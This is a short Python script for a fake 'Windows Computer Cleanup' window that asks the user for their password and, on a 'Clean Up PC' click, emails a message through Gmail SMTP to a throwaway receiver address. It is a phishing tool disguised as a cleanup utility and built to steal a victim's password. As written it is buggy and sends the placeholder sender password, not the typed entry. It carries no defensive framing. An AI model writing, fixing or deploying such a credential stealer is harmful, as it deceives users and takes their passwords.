from tkinter import *
import smtplib
import customtkinter

def send_password():
    sender_email = "throw away sender email here"
    receiver_email = "throw away receiver email here"
    password = "throw away sender email password here"
    message = password
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(sender_email, password)
    server.sendmail(sender_email, receiver_email, message)

customtkinter.set_appearance_mode("System")
customtkinter.set_default_color_theme("blue")

window = customtkinter.CTk()
window.title('Windows Computer Cleanup')

label = customtkinter.CTkLabel(window, text="Please enter your password")
label.pack()

password = customtkinter.CTkEntry(window, text='')
password.pack()

button = customtkinter.CTkButton(window, text='Clean Up PC', command = send_password)
button.pack()

window.geometry("300x200")

window.mainloop()